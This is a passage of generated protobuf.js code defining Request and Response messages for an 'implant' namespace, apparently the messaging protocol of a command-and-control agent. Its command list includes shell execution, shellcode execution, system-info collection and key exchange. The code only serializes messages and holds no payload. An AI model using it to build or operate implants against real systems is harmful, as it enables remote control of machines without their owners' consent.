            };

            /**
             * Creates a Request message from a plain object. Also converts values to their respective internal types.
             * @function fromObject
             * @memberof implant.Command.Request
             * @static
             * @param {Object.<string,*>} object Plain object
             * @returns {implant.Command.Request} Request
             */
            Request.fromObject = function fromObject(object) {
                if (object instanceof $root.implant.Command.Request)
                    return object;
                var message = new $root.implant.Command.Request();
                switch (object.command) {
                default:
                    if (typeof object.command === "number") {
                        message.command = object.command;
                        break;
                    }
                    break;
                case "AGENT_UNSPECIFIED":
                case 0:
                    message.command = 0;
                    break;
                case "AGENT_CHECKIN":
                case 1:
                    message.command = 1;
                    break;
                case "AGENT_SYSINFO":
                case 2:
                    message.command = 2;
                    break;
                case "AGENT_EXECUTE":
                case 3:
                    message.command = 3;
                    break;
                case "AGENT_EXECUTE_SHELLCODE":
                case 4:
                    message.command = 4;
                    break;
                case "AGENT_MESSAGE":
                case 5:
                    message.command = 5;
                    break;
                case "AGENT_SHUTDOWN":
                case 6:
                    message.command = 6;
                    break;
                case "AGENT_KEYX":
                case 7:
                    message.command = 7;
                    break;
                case "AGENT_SET_CONFIG":
                case 8:
                    message.command = 8;
                    break;
                case "AGENT_IGNORE":
                case 9:
                    message.command = 9;
                    break;
                }
                if (object.input != null)
                    if (typeof object.input === "string")
                        $util.base64.decode(object.input, message.input = $util.newBuffer($util.base64.length(object.input)), 0);
                    else if (object.input.length >= 0)
                        message.input = object.input;
                if (object.config != null) {
                    if (typeof object.config !== "object")
                        throw TypeError(".implant.Command.Request.config: object expected");
                    message.config = $root.implant.AgentConfig.fromObject(object.config);
                }
                return message;
            };

            /**
             * Creates a plain object from a Request message. Also converts values to other types if specified.
             * @function toObject
             * @memberof implant.Command.Request
             * @static
             * @param {implant.Command.Request} message Request
             * @param {$protobuf.IConversionOptions} [options] Conversion options
             * @returns {Object.<string,*>} Plain object
             */
            Request.toObject = function toObject(message, options) {
                if (!options)
                    options = {};
                var object = {};
                if (options.defaults) {
                    object.command = options.enums === String ? "AGENT_UNSPECIFIED" : 0;
                    if (options.bytes === String)
                        object.input = "";
                    else {
                        object.input = [];
                        if (options.bytes !== Array)
                            object.input = $util.newBuffer(object.input);
                    }
                    object.config = null;
                }
                if (message.command != null && message.hasOwnProperty("command"))
                    object.command = options.enums === String ? $root.implant.AgentCommand[message.command] === undefined ? message.command : $root.implant.AgentCommand[message.command] : message.command;
                if (message.input != null && message.hasOwnProperty("input"))
                    object.input = options.bytes === String ? $util.base64.encode(message.input, 0, message.input.length) : options.bytes === Array ? Array.prototype.slice.call(message.input) : message.input;
                if (message.config != null && message.hasOwnProperty("config"))
                    object.config = $root.implant.AgentConfig.toObject(message.config, options);
                return object;
            };

            /**
             * Converts this Request to JSON.
             * @function toJSON
             * @memberof implant.Command.Request
             * @instance
             * @returns {Object.<string,*>} JSON object
             */
            Request.prototype.toJSON = function toJSON() {
                return this.constructor.toObject(this, $protobuf.util.toJSONOptions);
            };

            /**
             * Gets the default type url for Request
             * @function getTypeUrl
             * @memberof implant.Command.Request
             * @static
             * @param {string} [typeUrlPrefix] your custom typeUrlPrefix(default "type.googleapis.com")
             * @returns {string} The default type url
             */
            Request.getTypeUrl = function getTypeUrl(typeUrlPrefix) {
                if (typeUrlPrefix === undefined) {
                    typeUrlPrefix = "type.googleapis.com";
                }
                return typeUrlPrefix + "/implant.Command.Request";
            };

            return Request;
        })();

        Command.Response = (function() {

            /**
             * Properties of a Response.
             * @memberof implant.Command
             * @interface IResponse
             * @property {implant.AgentCommand|null} [command] Response command
             * @property {Uint8Array|null} [output] Response output
             * @property {implant.ISysInfoData|null} [sysinfo] Response sysinfo
             * @property {implant.AgentCommandStatus|null} [status] Response status
             */

            /**
             * Constructs a new Response.
             * @memberof implant.Command
             * @classdesc Represents a Response.
             * @implements IResponse
             * @constructor
             * @param {implant.Command.IResponse=} [properties] Properties to set
             */
            function Response(properties) {
                if (properties)
                    for (var keys = Object.keys(properties), i = 0; i < keys.length; ++i)
                        if (properties[keys[i]] != null)
                            this[keys[i]] = properties[keys[i]];
            }

            /**
             * Response command.
             * @member {implant.AgentCommand} command
             * @memberof implant.Command.Response
             * @instance
             */
            Response.prototype.command = 0;

            /**
             * Response output.
             * @member {Uint8Array} output
             * @memberof implant.Command.Response
             * @instance
             */
            Response.prototype.output = $util.newBuffer([]);

            /**
             * Response sysinfo.
             * @member {implant.ISysInfoData|null|undefined} sysinfo
             * @memberof implant.Command.Response
             * @instance
             */
            Response.prototype.sysinfo = null;

            /**
             * Response status.
             * @member {implant.AgentCommandStatus} status
             * @memberof implant.Command.Response
             * @instance
             */
            Response.prototype.status = 0;

            /**
             * Creates a new Response instance using the specified properties.
             * @function create
             * @memberof implant.Command.Response
             * @static
             * @param {implant.Command.IResponse=} [properties] Properties to set
             * @returns {implant.Command.Response} Response instance
             */
            Response.create = function create(properties) {
                return new Response(properties);
            };

            /**
             * Encodes the specified Response message. Does not implicitly {@link implant.Command.Response.verify|verify} messages.
             * @function encode
             * @memberof implant.Command.Response
             * @static
             * @param {implant.Command.IResponse} message Response message or plain object to encode
             * @param {$protobuf.Writer} [writer] Writer to encode to
             * @returns {$protobuf.Writer} Writer
             */
            Response.encode = function encode(message, writer) {
                if (!writer)
                    writer = $Writer.create();
                if (message.command != null && Object.hasOwnProperty.call(message, "command"))
                    writer.uint32(/* id 1, wireType 0 =*/8).int32(message.command);
                if (message.output != null && Object.hasOwnProperty.call(message, "output"))
                    writer.uint32(/* id 2, wireType 2 =*/18).bytes(message.output);
                if (message.sysinfo != null && Object.hasOwnProperty.call(message, "sysinfo"))
                    $root.implant.SysInfoData.encode(message.sysinfo, writer.uint32(/* id 3, wireType 2 =*/26).fork()).ldelim();
                if (message.status != null && Object.hasOwnProperty.call(message, "status"))
                    writer.uint32(/* id 4, wireType 0 =*/32).int32(message.status);
                return writer;
            };

            /**
             * Encodes the specified Response message, length delimited. Does not implicitly {@link implant.Command.Response.verify|verify} messages.
             * @function encodeDelimited
             * @memberof implant.Command.Response
             * @static
             * @param {implant.Command.IResponse} message Response message or plain object to encode
             * @param {$protobuf.Writer} [writer] Writer to encode to
             * @returns {$protobuf.Writer} Writer
             */
            Response.encodeDelimited = function encodeDelimited(message, writer) {
                return this.encode(message, writer).ldelim();
            };

            /**
             * Decodes a Response message from the specified reader or buffer.
             * @function decode
             * @memberof implant.Command.Response
             * @static
             * @param {$protobuf.Reader|Uint8Array} reader Reader or buffer to decode from
             * @param {number} [length] Message length if known beforehand
             * @returns {implant.Command.Response} Response
             * @throws {Error} If the payload is not a reader or valid buffer
             * @throws {$protobuf.util.ProtocolError} If required fields are missing
             */
            Response.decode = function decode(reader, length) {
                if (!(reader instanceof $Reader))
                    reader = $Reader.create(reader);
                var end = length === undefined ? reader.len : reader.pos + length, message = new $root.implant.Command.Response();
                while (reader.pos < end) {
                    var tag = reader.uint32();
                    switch (tag >>> 3) {
                    case 1: {
                            message.command = reader.int32();
                            break;
                        }
                    case 2: {
                            message.output = reader.bytes();
                            break;
                        }
                    case 3: {
                            message.sysinfo = $root.implant.SysInfoData.decode(reader, reader.uint32());
                            break;
                        }
                    case 4: {
                            message.status = reader.int32();
                            break;
                        }
                    default:
                        reader.skipType(tag & 7);
                        break;
                    }
                }
                return message;
            };

            /**
             * Decodes a Response message from the specified reader or buffer, length delimited.
             * @function decodeDelimited
             * @memberof implant.Command.Response
             * @static
             * @param {$protobuf.Reader|Uint8Array} reader Reader or buffer to decode from
             * @returns {implant.Command.Response} Response
             * @throws {Error} If the payload is not a reader or valid buffer
             * @throws {$protobuf.util.ProtocolError} If required fields are missing
             */
            Response.decodeDelimited = function decodeDelimited(reader) {
                if (!(reader instanceof $Reader))
                    reader = new $Reader(reader);
                return this.decode(reader, reader.uint32());
            };

            /**
             * Verifies a Response message.
             * @function verify
             * @memberof implant.Command.Response
             * @static
             * @param {Object.<string,*>} message Plain object to verify
             * @returns {string|null} `null` if valid, otherwise the reason why it is not
             */
            Response.verify = function verify(message) {
                if (typeof message !== "object" || message === null)
                    return "object expected";
                if (message.command != null && message.hasOwnProperty("command"))
                    switch (message.command) {
                    default:
                        return "command: enum value expected";
                    case 0:
                    case 1:
                    case 2:
                    case 3:
                    case 4:
                    case 5:
                    case 6:
                    case 7:
                    case 8:
                    case 9:
                        break;
                    }
                if (message.output != null && message.hasOwnProperty("output"))
                    if (!(message.output && typeof message.output.length === "number" || $util.isString(message.output)))
                        return "output: buffer expected";
                if (message.sysinfo != null && message.hasOwnProperty("sysinfo")) {
                    var error = $root.implant.SysInfoData.verify(message.sysinfo);
                    if (error)
                        return "sysinfo." + error;
                }
                if (message.status != null && message.hasOwnProperty("status"))
                    switch (message.status) {
                    default:
                        return "status: enum value expected";
                    case 0:
                    case 1:
                    case 2:
                        break;
                    }
                return null;
            };

            /**
             * Creates a Response message from a plain object. Also converts values to their respective internal types.
             * @function fromObject
             * @memberof implant.Command.Response
             * @static
             * @param {Object.<string,*>} object Plain object
             * @returns {implant.Command.Response} Response
             */
            Response.fromObject = function fromObject(object) {
                if (object instanceof $root.implant.Command.Response)
                    return object;
                var message = new $root.implant.Command.Response();
                switch (object.command) {
                default:
                    if (typeof object.command === "number") {
                        message.command = object.command;
                        break;
                    }
                    break;
                case "AGENT_UNSPECIFIED":
                case 0:
                    message.command = 0;
                    break;
                case "AGENT_CHECKIN":
                case 1:
                    message.command = 1;
                    break;
                case "AGENT_SYSINFO":
                case 2:
                    message.command = 2;
                    break;
                case "AGENT_EXECUTE":
                case 3:
                    message.command = 3;
                    break;
                case "AGENT_EXECUTE_SHELLCODE":
                case 4:
                    message.command = 4;
                    break;
                case "AGENT_MESSAGE":
                case 5:
                    message.command = 5;
                    break;
                case "AGENT_SHUTDOWN":
                case 6:
                    message.command = 6;
                    break;
                case "AGENT_KEYX":
                case 7:
                    message.command = 7;
                    break;
                case "AGENT_SET_CONFIG":
                case 8:
                    message.command = 8;
                    break;
                case "AGENT_IGNORE":
                case 9:
                    message.command = 9;
                    break;
                }
                if (object.output != null)
                    if (typeof object.output === "string")
                        $util.base64.decode(object.output, message.output = $util.newBuffer($util.base64.length(object.output)), 0);
                    else if (object.output.length >= 0)
                        message.output = object.output;
                if (object.sysinfo != null) {
                    if (typeof object.sysinfo !== "object")
                        throw TypeError(".implant.Command.Response.sysinfo: object expected");
                    message.sysinfo = $root.implant.SysInfoData.fromObject(object.sysinfo);
                }
                switch (object.status) {
                default:
                    if (typeof object.status === "number") {
                        message.status = object.status;
                        break;
                    }
                    break;
                case "STATUS_UNSPECIFIED":
                case 0:
                    message.status = 0;
                    break;
                case "STATUS_SUCCESS":
                case 1:
                    message.status = 1;
                    break;
                case "STATUS_ERROR":
                case 2:
                    message.status = 2;
                    break;
                }
                return message;
            };

            /**
             * Creates a plain object from a Response message. Also converts values to other types if specified.
             * @function toObject
             * @memberof implant.Command.Response
             * @static
             * @param {implant.Command.Response} message Response
             * @param {$protobuf.IConversionOptions} [options] Conversion options
             * @returns {Object.<string,*>} Plain object
             */
            Response.toObject = function toObject(message, options) {
                if (!options)
                    options = {};
                var object = {};
                if (options.defaults) {
                    object.command = options.enums === String ? "AGENT_UNSPECIFIED" : 0;
                    if (options.bytes === String)
                        object.output = "";
                    else {
                        object.output = [];
                        if (options.bytes !== Array)
                            object.output = $util.newBuffer(object.output);
                    }
                    object.sysinfo = null;
                    object.status = options.enums === String ? "STATUS_UNSPECIFIED" : 0;
                }
                if (message.command != null && message.hasOwnProperty("command"))
                    object.command = options.enums === String ? $root.implant.AgentCommand[message.command] === undefined ? message.command : $root.implant.AgentCommand[message.command] : message.command;
                if (message.output != null && message.hasOwnProperty("output"))
                    object.output = options.bytes === String ? $util.base64.encode(message.output, 0, message.output.length) : options.bytes === Array ? Array.prototype.slice.call(message.output) : message.output;
                if (message.sysinfo != null && message.hasOwnProperty("sysinfo"))
                    object.sysinfo = $root.implant.SysInfoData.toObject(message.sysinfo, options);
                if (message.status != null && message.hasOwnProperty("status"))
                    object.status = options.enums === String ? $root.implant.AgentCommandStatus[message.status] === undefined ? message.status : $root.implant.AgentCommandStatus[message.status] : message.status;
                return object;
            };

            /**
             * Converts this Response to JSON.
             * @function toJSON
             * @memberof implant.Command.Response
             * @instance
             * @returns {Object.<string,*>} JSON object
             */
            Response.prototype.toJSON = function toJSON() {
                return this.constructor.toObject(this, $protobuf.util.toJSONOptions);
            };

            /**
             * Gets the default type url for Response
             * @function getTypeUrl
             * @memberof implant.Command.Response
             * @static
             * @param {string} [typeUrlPrefix] your custom typeUrlPrefix(default "type.googleapis.com")
             * @returns {string} The default type url
             */
            Response.getTypeUrl = function getTypeUrl(typeUrlPrefix) {
                if (typeUrlPrefix === undefined) {
                    typeUrlPrefix = "type.googleapis.com";
                }
                return typeUrlPrefix + "/implant.Command.Response";
            };

            return Response;
        })();

        return Command;
    })();

    return implant;
})();

module.exports = $root;
